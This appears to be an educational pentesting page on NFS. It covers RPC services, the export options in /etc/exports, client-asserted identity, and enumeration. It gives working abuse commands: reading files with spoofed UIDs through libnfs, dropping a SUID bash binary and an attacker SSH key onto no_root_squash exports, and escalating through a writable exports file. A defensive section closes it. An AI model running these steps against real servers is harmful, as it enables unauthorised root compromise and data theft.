---
title: NFS
layout: post
date: 2026-09-01
description: "Why an NFS export is an access-control decision made by the client, how root_squash and no_root_squash change that decision, and the enumeration and abuse paths that follow from /etc/exports."
permalink: /theory/protocols/nfs
---

# NFS (Network File System)

NFS is the traditional Unix file-sharing protocol. A server publishes directories ("exports") and clients attach them into their own filesystem tree. Unlike SMB, where a session is authenticated and the server evaluates a security descriptor per file, classic NFS does almost the opposite: the server publishes a list of *which clients* may attach an export, and then trusts those clients to report *who* is asking for each file.

That single design decision is the reason NFS shows up in privilege escalation chains so often. Understanding it makes almost every NFS finding predictable.

## The RPC layer underneath

NFS is not a single service on a single port. It is a family of ONC RPC programs, each identified by a program number, and each registered with a portmapper so clients can find it.

| Program | Number | Role |
|---|---|---|
| portmapper / rpcbind | 100000 | Directory of the others, always on 111 |
| nfs | 100003 | The file protocol itself, conventionally 2049 |
| mountd | 100005 | Hands out the initial file handle for an export (v3) |
| nfs_acl | 100227 | POSIX ACL extension |
| nlockmgr | 100021 | Advisory file locking (v3) |
| status | 100024 | Lock recovery notification (v3) |

Only `rpcbind` (111) and `nfsd` (2049) sit on fixed ports. `mountd`, `nlockmgr` and `statd` are assigned ephemeral ports at service start and register themselves with the portmapper. This is why an NFS server produces a scattering of high-numbered `unknown` ports in an `nmap` output, and why those port numbers change every time the service restarts.

The portmapper resolves them:

```bash
rpcinfo -p 10.10.10.10
```

```text
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100024    1   tcp  38867  status
    100005    3   tcp  33753  mountd
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100021    3   udp  50568  nlockmgr
```

> A block of unexplained high ports next to 111 and 2049 is almost never five separate applications. Map them with `rpcinfo -p` before spending time on version scans.
{: .prompt-tip }

NFSv4 collapses this: mounting, locking and the file protocol all travel over port 2049, there is no separate `mountd`, and the server presents a single pseudo-filesystem root instead of a list of independently mountable paths.

## /etc/exports is the entire access control policy

On Linux the export table is a flat text file, one export per line:

```text
/srv/share   192.168.1.0/24(rw,sync,no_subtree_check)   backup.lan(ro)
/root        10.0.0.247(ro,no_root_squash,insecure)
```

Each entry is a path followed by one or more *client specifications*, each with its own option list in parentheses. A client specification can be a hostname, an IP, a CIDR range, a wildcard such as `*.lan`, or a bare `*`.

The options that matter for an attacker:

| Option | Effect |
|---|---|
| `ro` / `rw` | Whether the client may write. `ro` is the default |
| `root_squash` | **Default.** Remaps incoming UID/GID 0 to `nobody` |
| `no_root_squash` | Incoming UID 0 stays UID 0 on the server |
| `all_squash` | Remaps *every* incoming UID to the anonymous user |
| `anonuid` / `anongid` | Which UID the squash maps to |
| `insecure` | Accept requests from source ports above 1023 |
| `no_subtree_check` | Performance option, unrelated to security |
| `sync` / `async` | Write durability, unrelated to security |

Nothing in that table is a credential. There is no password, no key, no ticket. The export line says which *network location* may connect, and the squash options say how much of the client's claimed identity to believe.

## AUTH_SYS: the client asserts its own identity

Classic NFS authentication is the RPC flavour `AUTH_SYS`. Every request carries a UID, a GID and a supplementary group list, supplied by the client, unverified. The server applies ordinary Unix permission checks against those numbers as if they were true.

The consequence is direct: if you can reach an export, you can be any user on it by claiming their UID. If the export holds `/home/alice` and `alice` is UID 1002 on the server, mounting it and reading her files as your own local UID 1002 works. No credential is involved at any point.

`root_squash` is the one mitigation built into this model, and it only closes one hole: it rewrites an incoming UID 0 to the anonymous user so that a client claiming to be root does not get root's files. It does nothing about UID 1002, or 7789, or any other real account.

> `root_squash` is not authentication. It is a single special case bolted onto a protocol that has no authentication. Any export reachable by an attacker is readable as every non-root UID it contains.
{: .prompt-danger }

Kerberos-backed flavours (`sec=krb5`, `krb5i`, `krb5p`) replace `AUTH_SYS` with real authentication and fix this properly, but they are rare outside environments that deployed them deliberately.

## Enumeration

Ask `mountd` what it is willing to export, and to whom:

```bash
showmount -e 10.10.10.10
```

```text
Export list for 10.10.10.10:
/srv/share 192.168.1.0/24
/backups   *
```

An empty list is unambiguous: `mountd` is running and answering, and the export table has no entries. That is a different fact from a mount being refused, and it is worth separating early. An export you are not in the client list for still appears in `showmount` output, so an empty list means there is nothing to attack yet, not that you lack access.

`showmount -a` lists currently active client mounts, and `showmount -d` lists directories that clients have mounted, both of which leak internal hostnames when the server allows them.

For NFSv4 there is no `mountd` to ask, so `showmount` returns nothing useful. Probe the pseudo-root directly instead:

```bash
sudo mount -t nfs4 -o ro,soft,timeo=5 10.10.10.10:/ /mnt/nfs
```

## Abusing a readable export

The mount is the easy part. Getting the right UID is the point:

```bash
sudo mount -t nfs -o vers=3 10.10.10.10:/srv/share /mnt/nfs
ls -ln /mnt/nfs
```

`ls -ln` prints numeric owners rather than resolving them against the *client's* `/etc/passwd`, which is what you actually want: those numbers are the server's UIDs. Create a local user with the matching UID, or simply `sudo -u '#1002'`, and read the files.

### Doing it without root, and without mounting

Mounting requires root on the attacking host, and it forces every request to carry the UID the local kernel assigns. [libnfs](https://github.com/sahlberg/libnfs) ships a set of userspace clients that speak NFS directly and let the UID and GID be set per request, in the URL:

```bash
nfs-ls  'nfs://10.10.10.10/srv/share/?version=3&uid=0&gid=0'
nfs-cat 'nfs://10.10.10.10/srv/share/secret.txt?version=3&uid=0&gid=0'
nfs-cp  'nfs://10.10.10.10/srv/share/secret.txt?version=3&uid=0&gid=0' -
```

This is the cleanest way to exercise an export: no root on the attacker side, no kernel mount to clean up, and the claimed identity is an explicit parameter rather than a side effect of which local account is running the command.

There is one prerequisite. A userspace client cannot bind a source port below 1024 without privileges, so the export must carry `insecure`. Without it the server rejects the connection purely on source port, and the fix is either to mount normally as root or to add `insecure` if you control the export line.

> `insecure` sounds like a general weakening but has one narrow meaning: accept requests originating from unprivileged source ports. It exists because the "only root can bind a low port" assumption is worthless once the client is attacker-controlled. Its practical effect is to let an unprivileged userspace client talk to the export at all.
{: .prompt-info }

## Abusing a writable export

`rw` plus `no_root_squash` on any path is a full host compromise, because writing as UID 0 into the server's filesystem is arbitrary root file creation. The two standard finishes:

```bash
# 1. SUID shell
cp /bin/bash /mnt/nfs/rootbash
chmod u+s /mnt/nfs/rootbash
# then, from a shell on the target:  /path/on/target/rootbash -p

# 2. SSH key into a root-owned home
mkdir -p /mnt/nfs/root/.ssh
cat attacker.pub >> /mnt/nfs/root/.ssh/authorized_keys
```

The SUID trick needs the export to be mounted `suid` on the server side (`nosuid` in the export options blocks it) and needs an existing way to execute files on the target. The key drop needs `PermitRootLogin` to allow key authentication. `rw` with `root_squash` is still valuable: everything the anonymous UID can write, plus everything any non-root UID can write, is still yours.

`ro` with `no_root_squash` is weaker but far from harmless: it is arbitrary file read as root, which reaches `/etc/shadow`, private keys, database credentials and flags.

## Writing the export table yourself

The export table is consumed by `exportfs`, which runs as root. Anything that lets an unprivileged user influence `/etc/exports` and then get `exportfs` re-run is a privilege escalation, because the attacker chooses both the path and the squash options.

The refresh is normally reached through the service unit:

```bash
systemctl cat nfs-kernel-server.service
```

```ini
[Service]
Type=oneshot
ExecStartPre=-/usr/sbin/exportfs -r
ExecStart=/usr/sbin/rpc.nfsd
ExecReload=-/usr/sbin/exportfs -r
```

So a `sudo` rule permitting `systemctl restart nfs-kernel-server.service`, a systemd unit an attacker can edit, or a cron job calling `exportfs -r` all become the second half of the primitive. The first half is write access to `/etc/exports`, which is worth checking with `getfacl` and not only with `ls -l`: a POSIX ACL entry granting one user `rw` is invisible in the mode bits, which still read `-rw-rw-r-- root root`.

```bash
stat -c '%A %U:%G %n' /etc/exports
getfacl -p /etc/exports
```

```text
-rw-rw-r-- root:root /etc/exports

# file: /etc/exports
# owner: root
# group: root
user::rw-
user:svcuser:rw-
group::r--
mask::rw-
other::r--
```

The `+` that `ls -l` appends to the mode string is the only hint in the standard listing, and it is easy to read past.

## Client matching and NAT

The server matches the client specification against the source address *it* observes. In a lab reached over a VPN, or in any environment with NAT between the attacker and the target, that address is not the one on the attacker's `tun0`. An export restricted to the wrong address is published successfully and then refuses every mount, which reads like a broken payload rather than a wrong client spec.

Derive the address from the target's point of view before writing the export line. If there is already a shell on the target, the SSH daemon has recorded it:

```bash
echo "$SSH_CONNECTION"
```

```text
10.0.0.247 57160 10.1.253.90 22
```

The first field is the client address as the target sees it. Failing that, `who`, `last`, `ss -tn`, or the server's own logs will do. Using `*` works too, but it exposes the export to the whole network for as long as it is up, which is the wrong trade in a shared environment.

## Defensive notes

- Prefer NFSv4 with `sec=krb5p`. It replaces the trust-the-client model with real authentication rather than patching around it.
- Never `no_root_squash`. Where a genuine need exists, scope it to a single host address and a single path, never a subnet or a wildcard.
- Restrict every export to specific hosts. `*` on any line is an unauthenticated read of that path from the whole reachable network.
- Export the narrowest directory that satisfies the requirement. `/srv/share/app` rather than `/srv`, and never a home directory root or `/`.
- Audit `/etc/exports` for ACLs, not just ownership, and treat any non-root write grant on it as equivalent to a root shell if the service can be refreshed.
- Firewall 111 and 2049 to the client subnets that actually need them.

## Examples on this site

Boxes on this site whose path goes through NFS, listed automatically from their tags:

{% assign nfs_tags = "nfs" | split: "," -%}
{% for post in site.posts -%}
{%- assign match = false -%}
{%- for t in post.tags -%}
{%- if nfs_tags contains t -%}{%- assign match = true -%}{%- endif -%}
{%- endfor -%}
{%- if match %}
- [{{ post.title }}]({{ post.url }}){% endif -%}
{%- endfor %}

## References

- [exports(5) manual page](https://man7.org/linux/man-pages/man5/exports.5.html)
- [RFC 1813 - NFS Version 3 Protocol Specification](https://datatracker.ietf.org/doc/html/rfc1813)
- [RFC 8881 - NFS Version 4 Protocol](https://datatracker.ietf.org/doc/html/rfc8881)
- [libnfs](https://github.com/sahlberg/libnfs)
- [Hacktricks - Pentesting NFS](https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html)
